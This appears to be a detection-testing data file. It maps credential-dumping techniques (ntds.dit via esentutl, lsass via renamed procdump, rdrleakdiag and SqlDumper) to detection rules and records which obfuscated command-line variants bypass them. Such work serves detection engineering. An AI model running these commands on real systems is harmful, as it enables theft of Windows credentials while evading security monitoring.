Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"" /d ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"" /D ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/P"" -d ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"""" -d ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"""" /""d"" ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"" -""d"" ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"" /""d"" ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" -AcceptEula -ma lsass.exe lsass.dmp"	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" /""AcceptEula"" -Ma lsass.exe lsass.dmp"	TRUE	TRUE	FALSE	LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e); Potential SysInternals ProcDump Evasion (79b06761-465f-4f88-9ef2-150e24d3d737); Potential LSASS Process Dump Via Procdump (5afee48e-67dd-4e03-a783-f74259dcf998)
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" /""AcceptEula"" -ma lsass.exe lsass.dmp"	TRUE	TRUE	FALSE	LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e); Potential SysInternals ProcDump Evasion (79b06761-465f-4f88-9ef2-150e24d3d737); Potential LSASS Process Dump Via Procdump (5afee48e-67dd-4e03-a783-f74259dcf998)
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" -aCcEpTeUlA -""ma"" lsass.exe lsass.dmp"	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" -AccEpteula -ma lsass.exe lsass.dmp"	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" -""AcceptEula"" -mA lsass.exe lsass.dmp"	TRUE	TRUE	FALSE	LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e); Potential SysInternals ProcDump Evasion (79b06761-465f-4f88-9ef2-150e24d3d737); Potential LSASS Process Dump Via Procdump (5afee48e-67dd-4e03-a783-f74259dcf998)
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" -acCEPtEuLA -""ma"" lsass.exe lsass.dmp"	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_dump64_defender_av_bypass_rename	Potential Windows Defender AV Bypass Via Dump64.EXE Rename	129966c9-de17-4334-a123-8b58172e664d		"copy procdump.exe ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" && ""\\?\C:\Program Files\Microsoft Visual Studio\dump64.exe"" -AccEpteulA -MA lsass.exe lsass.dmp"	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_hktl_crackmapexec_patterns	HackTool - CrackMapExec Process Patterns	f26307d8-14cd-47e3-a26b-4b4769f24af6		"cmd.exe /c ""tasklist,/v,/fo,csv | findstr /i lsass"""	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_hktl_crackmapexec_patterns	HackTool - CrackMapExec Process Patterns	f26307d8-14cd-47e3-a26b-4b4769f24af6		"cmd.exe -""c"" ""tasklist,/v,/fo,csv | findstr /i lsass"""	TRUE	TRUE	FALSE	Recon Command Output Piped To Findstr.EXE (ccb5742c-c248-4982-8c5c-5571b9275ad3); Recon Command Output Piped To Findstr.EXE (ccb5742c-c248-4982-8c5c-5571b9275ad3)
t1003.001	proc_creation_win_hktl_crackmapexec_patterns	HackTool - CrackMapExec Process Patterns	f26307d8-14cd-47e3-a26b-4b4769f24af6		"cmd.exe /""c"" ""tasklist,/v,/fo,csv | findstr /i lsass"""	TRUE	TRUE	FALSE	Recon Command Output Piped To Findstr.EXE (ccb5742c-c248-4982-8c5c-5571b9275ad3); Recon Command Output Piped To Findstr.EXE (ccb5742c-c248-4982-8c5c-5571b9275ad3)
t1003.001	proc_creation_win_lolbin_susp_sqldumper_activity	Dumping Process via Sqldumper.exe	23ceaf5c-b6f1-4a32-8559-f2ff734be516		"copy ""C:\Program Files\Microsoft SQL Server\130\Shared\SqlDumper.exe"" C:\temp\legit_service.exe && C:\temp\legit_service.exe 700 0 0x0110"	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b	C:\temp\updater.exe  /P 1337 /o C:\temp\ /fullmemdmp	copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe /P 1337 /o C:\temp\ /fullmemdmp	TRUE	FALSE	FALSE	Process Memory Dump via RdrLeakDiag.EXE (edadb1e5-5919-4e4c-8462-a9e643b02c4b); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b		"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe -""p"" 1337 /""o"" C:\temp\ /fullmemdmp"	TRUE	TRUE	FALSE	Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b		"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe /""p"" 1337 -""o"" C:\temp\ /FuLlmeMdmp"	TRUE	TRUE	FALSE	Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b	"C:\temp\updater.exe  /p 1337 /\""o\"" C:\temp\ /FuLLMEMdMp"	"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe /p 1337 /""o"" C:\temp\ /FuLLMEMdMp"	TRUE	FALSE	FALSE	Process Memory Dump via RdrLeakDiag.EXE (edadb1e5-5919-4e4c-8462-a9e643b02c4b); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b	"C:\temp\updater.exe  -\""p\"" 1337 /o C:\temp\ /FULLMeMDMp"	"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe -""p"" 1337 /o C:\temp\ /FULLMeMDMp"	TRUE	FALSE	FALSE	Process Memory Dump via RdrLeakDiag.EXE (edadb1e5-5919-4e4c-8462-a9e643b02c4b); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b	"C:\temp\updater.exe  /P 1337 /o C:\temp\ -\""fullmemdmp\"""	"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe /P 1337 /o C:\temp\ -""fullmemdmp"""	TRUE	FALSE	FALSE	Process Memory Dump via RdrLeakDiag.EXE (edadb1e5-5919-4e4c-8462-a9e643b02c4b); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b	"C:\temp\updater.exe  -\""p\"" 1337 /o C:\temp\ /fuLlMEmDMp"	"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe -""p"" 1337 /o C:\temp\ /fuLlMEmDMp"	TRUE	FALSE	FALSE	Process Memory Dump via RdrLeakDiag.EXE (edadb1e5-5919-4e4c-8462-a9e643b02c4b); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b	"C:\temp\updater.exe  /p 1337 /O C:\temp\ /\""fullmemdmp\"""	"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe /p 1337 /O C:\temp\ /""fullmemdmp"""	TRUE	FALSE	FALSE	Process Memory Dump via RdrLeakDiag.EXE (edadb1e5-5919-4e4c-8462-a9e643b02c4b); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b	"C:\temp\updater.exe  /p 1337 -\""o\"" C:\temp\ /fUlLMEMDmP"	"copy C:\Windows\System32\rdrleakdiag.exe C:\temp\updater.exe && C:\temp\updater.exe /p 1337 -""o"" C:\temp\ /fUlLMEMDmP"	TRUE	FALSE	FALSE	Process Memory Dump via RdrLeakDiag.EXE (edadb1e5-5919-4e4c-8462-a9e643b02c4b); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b		"rdrleakdiag.exe ""/p"" 1337 ""/o"" C:\temp\ /fullmemdmp"	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b		"rdrleakdiag.exe ""/p"""" 1337 ""/o"""" C:\temp\ /fUllMEMDMp"	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b		"rdrleakdiag.exe ""/p"" 1337 ""/o"" C:\temp\ /FuLlMEmDmp"	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_rdrleakdiag_process_dumping	Process Memory Dump via RdrLeakDiag.EXE	edadb1e5-5919-4e4c-8462-a9e643b02c4b		"rdrleakdiag.exe ""/p"" 1337 ""/o"""" C:\temp\ -""fullmemdmp"""	TRUE	TRUE	TRUE	
